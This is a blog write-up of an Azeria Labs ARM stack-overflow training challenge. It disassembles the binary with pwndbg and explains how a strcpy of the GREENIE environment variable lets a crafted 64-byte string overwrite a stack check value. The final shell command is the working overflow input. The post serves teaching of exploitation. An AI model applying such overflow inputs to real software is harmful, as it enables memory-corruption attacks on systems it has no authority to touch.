---
layout: post
title: "Smashing ARM Stack for Fun - Part III"
tags: [reversing, exploiting, ARM, iasm, azeria-labs]
inline_default_language: nasm
---

Another fast moving post
about exploiting the [third Arm challenge](https://github.com/azeria-labs/ARM-challenges)<!--more-->


## Setup

Stack allocation, not changes respect `stack0`{.none} or `stack1`{.none}.

```nasm
pwndbg> pdisass &main
 ► 0x104e4 <main>       push   {fp, lr}
   0x104e8 <main+4>     add    fp, sp, #4
   0x104ec <main+8>     sub    sp, sp, #0x50
   0x104f0 <main+12>    str    r0, [fp, #-0x50]
   0x104f4 <main+16>    str    r1, [fp, #-0x54]
```

Read of an environment variable named `"GREENIE"`{.cpp}:

```nasm
   0x104f8 <main+20>    ldr    r0, [pc, #0x6c]
   0x104fc <main+24>    bl     #getenv@plt <getenv@plt>

pwndbg> x/1wx 0x1056c
0x1056c <main+136>:     0x000105f4

pwndbg> x/1sb 0x000105f4
0x105f4:        "GREENIE"
```

The value is stored in the stack, loaded from it and
then compared with 0. In other words the program checks if
`getenv`{.none}
returned `NULL`{.cpp} or not.

```nasm
   0x10500 <main+28>    str    r0, [fp, #-8]
   0x10504 <main+32>    ldr    r3, [fp, #-8]
   0x10508 <main+36>    cmp    r3, #0
   0x1050c <main+40>    bne    #main+56 <main+56>
```

## The vulnerability

Following the *taken* branch we find the vulnerable `strcpy`{.none} call
that copies the content of the environment variable into a buffer in the
stack.

```nasm
 ► 0x1051c <main+56>    mov    r3, #0
   0x10520 <main+60>    str    r3, [fp, #-0xc]
   0x10524 <main+64>    sub    r3, fp, #0x4c
   0x10528 <main+68>    mov    r0, r3
   0x1052c <main+72>    ldr    r1, [fp, #-8]
   0x10530 <main+76>    bl     #strcpy@plt <strcpy@plt>
```

This is the memory layout of the stack before the call to
`strcpy`{.none}:

```python
100:20> ;! M[sp:]
[
        --
        |   \xee\xee\xee\xee   == char **argv
        |   \xdd\xdd\xdd\xdd   == int argc
buf ----|-->AAAA
  0x50  |   BBBB
        |   CCCC
        |   ... 13 more rows full of garbage ...
cookie----->\x00\x00\x00\x00   == explicit 0 set
ptr env-|-->\xcc\xcc\xcc\xcc   == char *env_var
        --
   0x8  |   \xbb\xbb\xbb\xbb   == fp
 fp ----|-->\xaa\xaa\xaa\xaa   == lr
        --
]
```

After the call the cookie is checked against 0x0d0a0d0a:

```nasm
   0x10534 <main+80>    ldr    r3, [fp, #-0xc]
   0x10538 <main+84>    ldr    r2, [pc, #0x34]
   0x1053c <main+88>    cmp    r3, r2
   0x10540 <main+92>    bne    #main+108 <main+108>

pwndbg> x/1wx 0x10574
0x10574 <main+144>:     0x0d0a0d0a
```

Following the path if the branch is **not** taken:

```nasm
pwndbg> pdisass &main+96
 ► 0x10544 <main+96>     ldr    r0, [pc, #0x2c]
   0x10548 <main+100>    bl     #puts@plt <puts@plt>

   0x1054c <main+104>    b      #main+124 <main+124>

pwndbg> x/1wx 0x10578
0x10578 <main+148>:     0x0001062c

pwndbg> x/1sb 0x0001062c
0x1062c:        "you have correctly modified the variable"
```

## The solution

To win we need 0x40 bytes for padding and the cookie `"\n\r\n\r"`{.cpp}.

```shell
pi@raspberrypi:~$ GREENIE="$(echo -en 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\r\n\r')" ./stack2
you have correctly modified the variable
```
